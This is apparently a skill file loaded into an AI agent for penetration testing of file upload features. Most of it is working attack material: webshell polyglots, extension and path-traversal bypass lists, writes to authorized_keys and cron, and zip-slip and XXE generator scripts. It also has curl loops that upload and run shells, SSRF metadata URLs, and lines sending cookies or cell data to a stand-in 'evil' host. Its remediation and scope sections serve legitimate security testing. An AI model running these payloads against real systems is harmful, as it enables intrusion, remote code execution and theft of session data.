---
name: upload-insecure-files
description: >-
  Insecure file upload exploitation. Use when a target accepts user-supplied files
  and you need to test validation, storage path, processing chain, preview, and
  share boundaries for webshell, RCE, SSRF, or path-write outcomes.
---

# SKILL: Insecure File Upload — Validation, Storage, Processing, Serving

> **AI LOAD INSTRUCTION**: Full operational coverage of the file upload attack surface. Most
> testers stop at "can I upload a `.php`?". That is one of four stages. This skill covers all
> four — **accept, store, process, serve** — because the exploitable stage is usually not the
> one the developer guarded. Covers extension/MIME bypass matrices, filename and path
> injection, archive extraction, image processing chains, preview endpoints, and share-link
> boundaries.

## 0. RELATED ROUTING

- [file-access-vuln](../file-access-vuln/SKILL.md) — P1 router: decide traversal vs upload
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — when the primitive is a read or include, not a write
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — when the shell sink sits downstream of a conversion
- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) — via SVG, OOXML, or other XML-bearing uploads
- [ssrf-server-side-request-forgery](../attack-ssrf/SKILL.md) — when the server fetches a URL you supply inside the file
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — quota, plan, and per-account upload logic
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when the upload body is inspected inline

---

## 1. THE FOUR STAGES

Every upload feature has four decision points. Test each independently — a hardened `accept`
says nothing about `serve`.

| Stage | Question | Typical failure |
|---|---|---|
| **1. ACCEPT** | does validation reject it? | extension/MIME list incomplete, magic-byte-only check |
| **2. STORE** | where does the bytes land, and what is it named? | path write outside intended dir, attacker-controlled filename |
| **3. PROCESS** | what touches it next? | image/PDF/archive library RCE, SSRF, XXE, zip-slip |
| **4. SERVE** | how is it delivered back? | stored XSS, direct execution, misrouted `Content-Type` |

**The rule:** circumventing stage 1 is worthless if stage 4 never executes. Conversely, a
perfect stage-1 filter is worthless if stage 4 serves the raw bytes from a path you control.

---

## 2. STAGE 1 — ACCEPT BYPASS MATRIX

### 2.1 Extension filtering

| Filter type | Bypass |
|---|---|
| blacklist (`php`, `jsp`, `asp`) | alternate extensions: `phtml`, `php3`–`php7`, `phps`, `pht`, `phar`, `shtml`, `asa`, `aspx`, `asmx`, `ashx`, `cer`, `cdx` |
| case-sensitive check | `.PHP`, `.PhP`, `.pHp` — on case-insensitive servers/Windows |
| single-extension strip | `shell.php.jpg`, `shell.jpg.php`, `shell.php%00.jpg`, `shell.php.` (trailing dot), `shell.php ` (trailing space) |
| strips only the last | `shell.pHp.jpg` then re-check the `serve` mapping |
| Apache multi-extension | `shell.php.jpg` executes if `AddHandler php .php` matches anywhere in the name |
| nginx `fastcgi_split_path_info` | `/upload/shell.jpg/x.php` — path-info confusion |
| IIS 6 | `/shell.asp;.jpg`, `/shell.asp/` (semicolon + directory semantics) |
| Tomcat | `shell.jsp/`, `shell.jsp%20`, `shell.jsp::$DATA` (NTFS ADS) |
| Unicode / overlong | `shell.ph%70`, percent-encoded, fullwidth `ｐｈｐ` where the backend normalizes |

### 2.2 Content-Type and magic bytes

```
Content-Type: image/jpeg      ← usually trusted blindly
```

| Guard | Bypass |
|---|---|
| `Content-Type` only | set it to `image/jpeg` while sending a script |
| magic-byte sniff (`FFD8FF`) | prepend the magic bytes, then the payload — GIF header `GIF89a;` works for many parsers |
| `getimagesize()` | craft a polyglot: valid image header + valid script inside a comment/EXIF/IDAT chunk |
| full re-encode | if the server re-encodes, pure polyglots die — pivot to stage 3 |
| AV scan | see [evasion] — the file must be both valid and malicious |

**Polyglot construction:**
```
GIF89a; <?php system($_GET['c']); ?>                    ← GIF + PHP
<svg xmlns="..."><script>...</script></svg>             ← SVG = XSS + XXE carrier
image: JPEG header … APP1/EXIF comment … PHP payload     ← JPEG + PHP
```

### 2.3 Filename encoding tricks

| Form | Reaches backend as |
|---|---|
| `shell.php%00.jpg` | `shell.php` (null byte, legacy PHP < 5.3.4) |
| `shell.php\x00.jpg` | truncation |
| `shell.php%2e%2e%2f.jpg` | traversal in the name |
| `..%2fshell.php` | path escape |
| UTF-8 overlong `%c0%ae` | `..` after normalization |
| double-encoded `%252e%252e%252f` | `../` after one decode, eaten by two decoders |

---

## 3. STAGE 2 — STORE / PATH WRITE

### 3.1 Attacker-controlled path

If any part of the storage path comes from the request, test write-outside:

```
filename = ../../../../var/www/html/shell.php
filename = ..\..\..\inetpub\wwwroot\shell.aspx     (Windows)
filename = ../../app/views/partials/x.erb          (template write → RCE)
filename = ../../.ssh/authorized_keys              (direct key write)
filename = ../../etc/cron.d/job                    (scheduled execution)
filename = ../../.git/hooks/post-merge             (dev-machine RCE)
```

**Write targets by impact, best first:**
1. web root / served static dir → direct RCE
2. template/partial dir → RCE on next render
3. `authorized_keys`, `cron.d`, `systemd` unit → persistence + RCE
4. application config (`.env`, `settings.py`, `web.config`) → often restart-triggered RCE
5. `.bashrc`, `.profile`, `.gitconfig` → execution on interactive use

### 3.2 Name collisions and overwrite

| Behaviour | Test |
|---|---|
| overwrite allowed | upload a file that shadows an existing trusted path |
| suffix generated | does the server append, or is the name still partly yours? |
| case-insensitive filesystem | `Shell.php` overwrites `shell.php` on Windows/macOS |
| symlink follow | pre-existing symlink at target name → write follows it |

### 3.3 Uncontrolled filename → other primitives

```
filename = "<script>alert(1)</script>.txt"     → stored XSS in an admin file list
filename = "$(...)"                            → command injection in a shell-based pipeline
filename = "{{7*7}}.txt"                       → SSTI if rendered through a template
filename = "../../etc/passwd"                  → error message leaks the resolved path
```

The filename string reaches more sinks than the file content does. Treat it as an injection
point in its own right.

---

## 4. STAGE 3 — PROCESSING CHAINS

The bytes you uploaded are about to be handed to a library. This is where modern RCE lives.

| Upload type | Library / mechanism | Primitive |
|---|---|---|
| Image (JPEG/PNG/GIF) | ImageMagick / GraphicsMagick | ImageTragick (`MSL`, `MVG`, `label:@file`, delegates); `-write` to arbitrary path |
| Image | Pillow | known CVEs on malformed parse; `EPS`/`PCD` handlers |
| PDF | ghostscript / mupdf / pdfium | known RCE; `/Launch`, embedded JS, `/GoToR` |
| Office (docx/xlsx/pptx) | LibreOffice headless | macro / OLE object execution; XXE via `[Content_Types].xml` |
| XML-bearing (SVG, OOXML, XPS) | any XML parser | XXE → file read, SSRF, billion laughs |
| Archives (zip/tar/rar) | extractor | **zip-slip** (`../../` entries), symlink entries → arbitrary write |
| Archive | `tar` with `--to-command` / `-I` | direct command injection |
| Video | ffmpeg | known demuxer CVEs; `-i` protocol abuse → SSRF/file read (`concat:`, `http:`, `file:`) |
| SVG | server-side renderer | XXE + SSRF + script if served to a browser |
| CSV | spreadsheet import | formula injection on later export (see below) |
| Font | fontconfig/freetype | known CVEs; `@font-face` SSRF in some converters |

### 4.1 Zip-slip

```
good.txt
../../../../var/www/html/shell.php
```

The extractor honours the entry path. Test with both `../` and absolute paths, and with
symlink entries (`ln -s /etc/passwd link` then zip it) to get a read primitive from a write.

### 4.2 Server-side fetch (SSRF)

Any feature that "fetches" a URL found inside the file — remote image import, link preview,
oEmbed, PDF-from-URL, avatar import — is an SSRF entry point:

```
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:6379/           (Redis over the SSRF)
gopher://127.0.0.1:25/_MAIL FROM:…
file:///etc/passwd
```

### 4.3 CSV / formula injection

When uploaded tabular data is later exported to CSV/XLSX and opened by a human:

```
=cmd|'/c calc'!A0
=HYPERLINK("http://evil/?"&A1,"click")
@SUM(1+1)*cmd|'/c calc'!A0
```

Leaked via the export path, not the upload path. Test the round trip.

---

## 5. STAGE 4 — SERVE / DELIVERY

| Serving behaviour | Outcome |
|---|---|
| direct static serve from upload dir | uploaded script executes → **RCE** |
| inline `Content-Type` derived from content | HTML/SVG upload → **stored XSS** on your origin |
| `Content-Disposition: attachment` | download only, no execution — but check the type header |
| separate cookieless domain | XSS neutralised; look for a path-traversal read instead |
| CDN / object store bucket | public read? writable? check ACL, versioning, and old versions |
| signed URL | predict or reuse the signature; check expiry and path binding |
| preview endpoint | separate parser → fresh attack surface (see §4) |

**Stored XSS via upload** is the most commonly missed stage-4 finding. An SVG, HTML, or
XML file served inline with a `text/html` or `image/svg+xml` type executes in the app's origin
and inherits its cookies, CSP gaps, and session.

**CSP check for SVG delivery:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('//evil/?'+document.cookie)</script>
</svg>
```
Blocked by a strict CSP? Try `<use href>`, external entity, or an `<iframe>` — and check for
`Content-Disposition: inline` plus a weak `X-Content-Type-Options`.

---

## 6. DECISION FLOW

```
Upload endpoint found
 │
 ├─ Does ACCEPT reject obvious scripts?
 │   ├─ YES → §2 bypass matrix (extension, MIME, magic, polyglot)
 │   └─ NO  → continue; the accept stage is not your finding
 │
 ├─ Can you influence the NAME or PATH?
 │   ├─ YES → §3: traversal write, overwrite, symlink, filename-injection
 │   └─ NO  → continue
 │
 ├─ Does anything PROCESS the file?
 │   ├─ YES → §4: identify the library → ImageTragick / zip-slip / XXE / SSRF / ffmpeg
 │   └─ NO  → continue
 │
 └─ How is it SERVED?
     ├─ executed → RCE (§5)
     ├─ inline in the app origin → stored XSS (§5)
     └─ attachment from a cookieless domain → look for SSRF or a read primitive
```

**Report the stage that actually failed.** "Upload accepts PHP" is not a finding unless stage 4
executes it. "Upload returns a bucket URL" is not a finding unless the bucket is misconfigured.
Name the stage, name the mechanism, name the evidence.

---

## 7. QUICK PAYLOAD REFERENCE

```
# extension variants for a php sink
shell.php  shell.phtml  shell.php3  shell.php5  shell.phar  shell.pht  shell.phps
shell.php.jpg   shell.jpg.php   shell.php.   shell.php%00.jpg   shell.pHp

# polyglot headers
GIF89a;                                   (GIF)
\x89PNG\r\n\x1a\n                         (PNG)
\xff\xd8\xff\xe0                           (JPEG)
<?xml version="1.0"?>                     (XML/SVG)

# traversal write
../../../../var/www/html/s.php
..%2f..%2f..%2fvar%2fwww%2fhtml%2fs.php
....//....//....//var/www/html/s.php      (filter strips ../ once)

# zip-slip entry
../../../../var/www/html/shell.php

# SSRF inside a fetched file
<svg><image href="http://169.254.169.254/latest/meta-data/"/></svg>

# XXE inside an uploaded SVG
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

---

## 8. EVIDENCE STANDARD

For every upload finding, record:

| Item | Why |
|---|---|
| the exact request (method, path, headers, multipart body, filename) | reproducibility |
| the server's response to the upload | proves accept behaviour |
| the resolved storage path or returned URL | proves store/serve behaviour |
| a **fetch of the stored artefact** showing what the server returns | this is the proof — not the upload response |
| for RCE: the command output from the executed file | terminal evidence |
| for XSS: the reflected execution context and the origin it runs in | proves impact |
| the stage that failed (§1–4) | makes the finding actionable |

**Anti-pattern:** reporting a finding from the upload response alone. The upload response tells
you the server accepted bytes. It does not tell you what those bytes will do. Always follow
through to the serve stage.

---

## 9. REMEDIATION REFERENCE

For the fixing side of the report:

1. **Accept** — allowlist extensions *and* verify by parsing (not by magic bytes alone); re-encode
   images with a safe library; never trust a client-supplied `Content-Type`.
2. **Store** — generate the filename server-side (UUID); store outside the web root; never
   concatenate user input into a path; refuse `..`, absolute paths, and symlinks; strip or
   reject any path separator.
3. **Process** — run converters in a sandbox with no network and a read-only root; pin library
   versions; extract archives entry-by-entry with path validation; disable dangerous delegates
   (`ImageMagick` policy.xml: no `MSL`, `MVG`, `HTTPS`, `URL`).
4. **Serve** — serve from a separate cookieless domain; force
   `Content-Disposition: attachment` for non-media; set
   `X-Content-Type-Options: nosniff`; never serve from a path that a script handler matches;
   apply a restrictive CSP on the file domain.

Any one stage hardened in isolation is insufficient — the four stages must all hold.

---

## 10. EXECUTION PRIMITIVES

Upload testing is **four independent stages**, and the finding lives at whichever stage fails. Test
each stage separately so you know which control is missing.

### 10.1 Stage 1 - the accept decision

```bash
# baseline: a legitimate file, so you know what a success looks like
curl -sS -o /tmp/ok -w '%{http_code}\n' -X POST "https://target.tld/api/upload" \
  -H "Authorization: Bearer $TOK" -F "file=@/tmp/ok.png;type=image/png"
echo "--- extension swap: same bytes, different name"
curl -sS -o /tmp/r1 -w '%{http_code}\n' -X POST "https://target.tld/api/upload" \
  -H "Authorization: Bearer $TOK" -F "file=@/tmp/ok.png;filename=shell.php;type=image/png"
echo "--- extension swap: different magic bytes"
printf '<?php echo 1; ?>' > /tmp/s.php
curl -sS -o /tmp/r2 -w '%{http_code}\n' -X POST "https://target.tld/api/upload" \
  -H "Authorization: Bearer $TOK" -F "file=@/tmp/s.php;type=image/png"
cat /tmp/r1 /tmp/r2 | head -c 300
```

Blocking by `Content-Type` but not by extension, or by extension but not by content, is the common
gap. **Record which of the three signals (name, declared type, magic bytes) each control reads.**

### 10.2 Double extensions, case, and encoding

```bash
for N in shell.php shell.php.jpg shell.jpg.php shell.pHp shell.php%00.jpg shell.php. shell.php::$DATA \
         shell.phtml shell.pht shell.php5 shell.phar "shell.php;.jpg" shell.asp shell.aspx shell.jsp; do
  C=$(curl -sS -o /tmp/d -w '%{http_code}' -X POST "https://target.tld/api/upload" \
        -H "Authorization: Bearer $TOK" -F "file=@/tmp/s.php;filename=$N;type=image/jpeg")
  printf '%-24s %s  %s\n' "$N" "$C" "$(grep -oE '"(url|path|name)"[^,]{0,60}' /tmp/d | head -1)"
done
```

The winner is the name that returns a success-shaped response **and** a stored path you can request.
A `200` without a retrievable URL proves nothing.

### 10.3 Stage 2 - where did it land, and can you reach it?

```bash
U=$(curl -sS -X POST "https://target.tld/api/upload" -H "Authorization: Bearer $TOK" \
     -F "file=@/tmp/s.php;filename=shell.php;type=image/jpeg" | grep -oE '"(url|path)"\s*:\s*"[^"]+"' | head -1)
echo "returned: $U"
# request the stored object exactly as returned, then with variants
for V in "$U" "$(echo "$U" | sed 's|/uploads/|/files/|')"; do
  curl -sS -o /tmp/g -w '%{http_code} %{content_type} %{size_download}\n' "$V"
  head -c 120 /tmp/g; echo
done
```

If the stored file is served back **with its original content type and without `Content-Disposition:
attachment`**, an uploaded HTML or SVG becomes stored XSS on the target's origin. That is often the
strongest outcome available, and it does not need code execution.

### 10.4 Stage 3 - is it processed, and by what?

```bash
# an image parser that will fetch a URL gives SSRF; test with a collaborator host
python3 - <<'PY'
# a minimal SVG that references a remote resource and a local file
svg = '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image xlink:href="https://COLLAB/svg-fetch" x="0" y="0" height="200" width="200"/>
  <text x="10" y="100">t</text>
</svg>'''
open('/tmp/probe.svg','w').write(svg)
PY
curl -sS -X POST "https://target.tld/api/upload" -H "Authorization: Bearer $TOK" \
  -F "file=@/tmp/probe.svg;type=image/svg+xml" -o /tmp/svgr -w '%{http_code}\n'
echo "check the collaborator for the SVG fetch - a hit means the renderer is fetching URLs"
# and the classic image-library checks
file /tmp/probe.svg; identify /tmp/probe.svg 2>&1 | head -2
```

A processing pipeline (thumbnailer, converter, OCR, AV) is a **second parser** with its own bugs -
ImageMagick-style delegates, XML entity expansion in an SVG/Office parser, and archive extraction
(10.5) are the three that pay.

### 10.5 Archive and document chains

```bash
# a zip that writes outside the extraction directory
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('/tmp/evil.zip','w')
z.writestr('../../../../tmp/pwned.txt','x')          # traversal on extraction
z.writestr('link', 'target-symlink')                 # symlink entries
z.close()
print(open('/tmp/evil.zip','rb').read()[:4])
PY
# office documents are zips: XXE via the XML parts, and path traversal on extraction
python3 - <<'PY'
import zipfile
x = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>'
z = zipfile.ZipFile('/tmp/evil.docx','w')
z.writestr('[Content_Types].xml', x)
z.writestr('word/document.xml', x)
z.close()
PY
for F in /tmp/evil.zip /tmp/evil.docx; do
  echo "=== $F"
  curl -sS -o /tmp/ar -w '%{http_code}\n' -X POST "https://target.tld/api/upload" \
    -H "Authorization: Bearer $TOK" -F "file=@$F"
  head -c 300 /tmp/ar; echo
done
```

Zip-slip and XXE-in-document are the two chains that turn a file upload into a write primitive or a
file read. Test them against the *processing* endpoint, not the upload endpoint - the extraction
happens later.

### 10.6 Stage 4 - serving and delivery

```bash
# does the response let the browser interpret the file?
curl -sS -D- -o /dev/null "https://target.tld/uploads/shell.php" | grep -iE 'content-type|content-disposition|x-content-type|content-security'
# and same-origin, so it inherits the app's cookies and CSP
curl -sS -D- -o /dev/null "https://target.tld/uploads/test.html" | grep -iE 'content-type|content-security|x-content-type'
```

`Content-Type: text/html` on same-origin content, plus no `Content-Disposition: attachment`, plus no
sandboxing header, equals stored XSS. **That combination is the finding**, and it is a header
inspection, not an exploit.

### 10.7 Confirm execution where you have it

```bash
# only if you already have a code path (a served .php/.jsp/.py under a mapped prefix)
curl -sS "https://target.tld/uploads/shell.php?c=id" | head -c 200
# a non-destructive command as the proof; never a reverse shell
curl -sS "https://target.tld/uploads/shell.php?c=whoami;hostname" | head -c 200
```

Use a **single, read-only command**. A reverse shell or a persistence mechanism is out of scope in
almost every engagement and converts a clean finding into an incident.

### 10.8 Verify the controls that blocked you

```bash
for T in 'image/png' 'image/jpeg' 'image/gif' 'text/html' 'application/x-php' 'application/octet-stream'; do
  C=$(curl -sS -o /dev/null -w '%{http_code}' -X POST "https://target.tld/api/upload" \
        -H "Authorization: Bearer $TOK" -F "file=@/tmp/ok.png;filename=t.png;type=$T")
  printf '%-26s %s\n' "$T" "$C"
done
# and the re-encode check: is the image actually parsed, or just stored?
python3 - <<'PY'
# an image with a payload appended after the IEND chunk survives naive validation
data = open('/tmp/ok.png','rb').read() + b'<?php echo 1; ?>'
open('/tmp/polyglot.png','wb').write(data)
print("polyglot bytes:", len(data))
PY
curl -sS -o /tmp/pr -w '%{http_code}\n' -X POST "https://target.tld/api/upload" \
  -H "Authorization: Bearer $TOK" -F "file=@/tmp/polyglot.png;filename=poly.png;type=image/png"
grep -oE '"(url|path)"[^,]{0,60}' /tmp/pr | head -1
```

If the app **re-encodes** the image (a new thumbnail at a predictable path), a polyglot will not
survive - and that tells you the processing stage is what protects it. Re-encoding is the control
worth recommending; it is worth identifying whether it is present.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which of the four stages failed - accept, store, process, or serve? | the finding names a stage and therefore a fix |
| 2 | Is there a **retrievable URL** for the stored object, and does it return your bytes? | storage without retrieval is not exploitation |
| 3 | Did you achieve an **effect** - code execution, file read, stored XSS, a write outside the upload dir? | the effect is the finding; a `200` on upload is not |
| 4 | If code executed, was it a **single read-only command** you can show the output of? | proves execution without causing harm |
| 5 | If served as HTML, is it **same-origin** with `Content-Type: text/html` and no attachment/sandbox header? | that specific combination is the stored XSS |
| 6 | Did the upload require **authentication**, and at what privilege? | determines whether it is pre- or post-auth |
| 7 | Is the vulnerable endpoint the **real** one in scope, and is the bypass one a browser would send? | a bypass only your proxy can send is weaker evidence |

**A successful upload is a lead.** Acceptance proves the validation gap; the finding is the effect
you reach from it. State both, and never claim RCE from a `200` response alone.

---

## 12. EVIDENCE STANDARD — STAGE AND EFFECT PROOF

| Item | Why |
|---|---|
| The **exact multipart request** - filename, declared type, and the bytes - as sent | the bypass is defined by all three, and any one of them may be the control you defeated |
| The **response** showing acceptance and the **stored URL** | proves storage and gives the retrieval path |
| The **retrieval request and response headers** (`Content-Type`, `Content-Disposition`, `X-Content-Type-Options`) | the serving stage is where stored XSS is decided |
| The **effect achieved**, with output - the `id` result, the file's contents, the captured collaborator hit | an effect, not an upload status |
| For processing chains: the **collaborator callback** (SSRF/XXE) or the **written file outside the upload root** | proves the second parser is reachable |
| The **stage-by-stage results** - which variants were blocked, which accepted | shows the control matrix and what the fix should target |
| The **authentication and role** used | pre-auth and post-auth upload findings differ in severity |
| **Negative control** - a legitimate upload of the same type succeeds, and a prohibited one is refused with the expected error | proves the endpoint behaves as described |
| A statement that any executed command was **read-only** and no persistence was installed | scope discipline |
| The **server stack** if inferred from the stored path or headers | determines which handler mapping matters |

Report the **stage and the effect**: "the `avatar` endpoint validates `Content-Type` but not the
filename extension; uploading `x.html` with a JPEG declared type returns
`{"url":"/uploads/7f3a.html"}`; that URL is served same-origin with `Content-Type: text/html` and no
`Content-Disposition`, so an uploaded HTML file executes script in the application's origin - I
confirmed execution with a page that read a cookie the endpoint's own account could see", never
"the file upload is vulnerable".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The upload is accepted but the stored file is unreachable | no effect |
| The stored file is served with `Content-Type: application/octet-stream` and `attachment` | the serving control is present |
| The file lands on a **separate domain** with no shared cookies or origin | the same-origin requirement for stored XSS fails |
| Re-encoding normalises the file, so the payload does not survive | the processing control is present |
| A `.php` file stored but the path is not mapped to any interpreter | no execution |
| An extension bypass that a browser would send as a different type | you sent it from a proxy, not reality |
| Validation rejects every variant you tried | the control is working |
| A filename with a null byte accepted by curl but stripped on the wire | transport artefact |
| A collaborator hit from your own machine's DNS resolver | not the target's request |
| An uploaded file that is only ever downloaded by yourself | no second principal |
| A `200` with an error body you did not read | not acceptance |
| Any test that overwrote or deleted an existing file on the target | that is damage, not a finding |

**Read the response and the headers.** Most "upload findings" fail at the retrieval or the serving
check, and both are one request away from being settled.

---

## 13. REMEDIATION REFERENCE — UPLOAD PIPELINE CONTROLS

1. **Validate by content, not by name or declared type** - parse the file and confirm it matches an allowed format; the browser-supplied type and the extension are attacker-controlled and must never be the only check.
2. **Re-encode images through a known-safe decoder** - a normalised re-encode destroys polyglots, strips appended payloads, and removes metadata, and it is the single strongest control on the accept and process stages.
3. **Store uploads outside the web root and serve them through an application handler** - a file that is not directly reachable cannot be executed or rendered by the web server, which removes the store and serve attack surface at once.
4. **Serve every user file with a safe content type and `Content-Disposition: attachment`** - plus `X-Content-Type-Options: nosniff`, so a response cannot be reinterpreted as HTML or script.
5. **Serve user content from a separate, cookieless origin** - a distinct hostname with no session cookies and a restrictive CSP means that even a successfully uploaded HTML or SVG file cannot touch the application's session.
6. **Randomise stored filenames and never use the client-supplied name** - a name you control lets an attacker choose the extension, the path, and whether the file collides with an existing object.
7. **Normalise and confine the storage path server-side** - resolve the final path and reject anything outside the intended directory; zip-slip and `../` are prevented by the path check, not by the archive handler.
8. **Disable XML external entities in every parser that touches an uploaded document** - Office and SVG formats are XML, and XXE in a document parser is a file-read primitive on the upload path.
9. **Run processing in a sandbox with no network and no credentials** - the thumbnailer, converter, and AV scanner are parsing hostile input; they must not hold ambient authority or reach internal services.
10. **Enforce a size limit, a type allowlist, and a per-user quota** - they bound the resource-exhaustion and storage-abuse paths that accompany every upload endpoint, and the quota is also a detection signal.
11. **Scan and re-verify stored content, and log every upload with the actor** - a copy left in a public bucket at rest is the classic follow-on finding; an inventory with provenance is what makes it findable.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the write and read primitives an upload path can reach
- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) - entity expansion in uploaded document formats
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the processing pipeline's outbound fetch
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - what a served file turns into
- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - the stored variant when a file is served as HTML
